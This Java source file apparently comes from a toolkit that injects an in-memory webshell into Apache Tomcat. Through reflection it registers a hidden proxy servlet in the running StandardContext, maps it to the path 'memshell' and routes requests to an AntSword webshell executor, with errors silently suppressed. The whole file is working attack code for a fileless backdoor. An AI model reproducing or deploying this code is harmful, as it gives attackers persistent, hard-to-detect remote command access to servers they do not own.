package com.spkiddai.memoryserver.Msmap;

import static com.spkiddai.memoryserver.Tools.ClassLoaderTools.*;
import static com.spkiddai.memoryserver.Tools.ReflectionTools.*;
import com.spkiddai.memoryserver.Tools.AntSwordTool;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.*;

public class TomcatServlet implements InvocationHandler {
    private static String pattern = "memshell";

    private void hook(Object servletRequest, Object servletResponse) {
        AntSwordTool antswordUtil = new AntSwordTool();
        antswordUtil.exec((HttpServletRequest) servletRequest, (HttpServletResponse) servletResponse);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("service")) {
            Object servletRequest = args[0];
            Object servletResponse = args[1];
            hook(servletRequest, servletResponse);
        }
        return null;
    }

    private void addSevlet(Object proxyObject) throws Exception {
        Object context = getStandardContext();
        Object wrapper = invokeMethod(context, "createWrapper");
        String name = this.getClass().getName();
        invokeMethod(wrapper, "setServletName", name);
        invokeMethod(wrapper, "setLoadOnStartupString", "1");
        getField(wrapper, "instance").set(wrapper, proxyObject);
        invokeMethod(
            wrapper, "setServletClass", proxyObject.getClass().getName()
        );
        getMethodX(context.getClass(), "addChild", 1).invoke(context, wrapper);
        getMethodX(context.getClass(), "addServletMappingDecoded", 3)
            .invoke(context, pattern, name, false);
    }

    public void Register() {
        Class servletClass = null;
        try {
            servletClass = Class.forName(
                "javax.servlet.Servlet"
            );
        } catch (ClassNotFoundException e) {
            try {
                servletClass = Class.forName(
                    "jakarta.servlet.Servlet"
                );
            } catch (ClassNotFoundException ex) {}
        }
        if (servletClass != null) {
            Object proxyObject = Proxy.newProxyInstance(
                getLoader(), new Class[]{servletClass}, this
            );
            try {
                addSevlet(proxyObject);
            } catch (Exception e) {}
        }
    }
}
